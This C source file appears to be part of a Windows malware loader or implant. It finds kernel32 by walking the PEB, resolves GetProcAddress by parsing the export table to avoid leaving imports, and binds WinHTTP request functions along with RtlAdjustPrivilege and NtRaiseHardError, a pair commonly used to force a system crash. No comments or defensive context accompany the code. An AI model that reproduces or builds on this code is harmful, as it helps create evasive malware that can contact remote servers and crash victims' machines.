#include <stdint.h>
#include "API.h"

#define WIN_FUN(x, y, z) Win32.API.x = Win32.API.rGetProcAddress(Win32.MODULE.y, z)

PVOID GetKernel32() {
    PEB*                  peb            = (PEB*)__readgsqword(0x60);
    LDR_DATA_TABLE_ENTRY* pKernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return pKernel32Entry->DllBase;
}

_GetProcAddress GetGetProcAddress() {
    IMAGE_DOS_HEADER*       pDosHeader            = (IMAGE_DOS_HEADER*)GetKernel32();
    IMAGE_NT_HEADERS*       pNtHeaders            = (IMAGE_NT_HEADERS *)(pDosHeader->e_lfanew + (size_t)pDosHeader);
    IMAGE_EXPORT_DIRECTORY* pExportTable          = (IMAGE_EXPORT_DIRECTORY *)((size_t)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    const int32_t*          pNameTablesOffset     = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfNames);
    const int16_t*          pOrdinalTablesOffset  = (const int16_t *)((size_t)pDosHeader + pExportTable->AddressOfNameOrdinals);
    const int32_t*          pAddressTablesOffset  = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfFunctions);
    
    int i = 0;
    while(strcmp((char*)pDosHeader + pNameTablesOffset[i], STR_GETPROCADDRESS) != 0) {++i;}
    return (_GetProcAddress)((size_t)pDosHeader + pAddressTablesOffset[pOrdinalTablesOffset[i]]);
}

void BindAPI() {
    Win32.MODULE.Kernel32     = (HMODULE)GetKernel32();
    Win32.API.rGetProcAddress = GetGetProcAddress();
    Win32.API.rLoadLibraryA   = Win32.API.rGetProcAddress(Win32.MODULE.Kernel32, STR_LOADLIBRARYA);
    Win32.MODULE.Ntdll        = Win32.API.rLoadLibraryA(STR_NTDLL);
    Win32.MODULE.Winhttp      = Win32.API.rLoadLibraryA(STR_WINHTTP);

    WIN_FUN(rWinHttpOpen, Winhttp, STR_WINHTTPOPEN);
    WIN_FUN(rWinHttpConnect, Winhttp, STR_WINHTTPCONNECT);
    WIN_FUN(rWinHttpOpenRequest, Winhttp, STR_WINHTTPOPENREQUEST);
    WIN_FUN(rWinHttpSendRequest, Winhttp, STR_WINHTTPSENDREQUEST);
    WIN_FUN(rWinHttpReceiveResponse, Winhttp, STR_WINHTTPRECEIVERESPONSE);
    WIN_FUN(rWinHttpQueryHeaders, Winhttp, STR_WINHTTPQUERYHEADERS);
    WIN_FUN(rWinHttpQueryDataAvailable, Winhttp, STR_WINHTTPQUERYDATAAVAILABLE);
    WIN_FUN(rWinHttpReadData, Winhttp, STR_WINHTTPREADDATA);
    WIN_FUN(rWinHttpCloseHandle, Winhttp, STR_WINHTTPCLOSEHANDLE);
    WIN_FUN(rWinHttpSetOption, Winhttp, STR_WINHTTPSETOPTION);

    WIN_FUN(rRtlAdjustPrivilege, Ntdll, STR_RTLADJUSTPRIVILEGE);
    WIN_FUN(rNtRaiseHardError, Ntdll, STR_NTRAISEHARDERROR);
}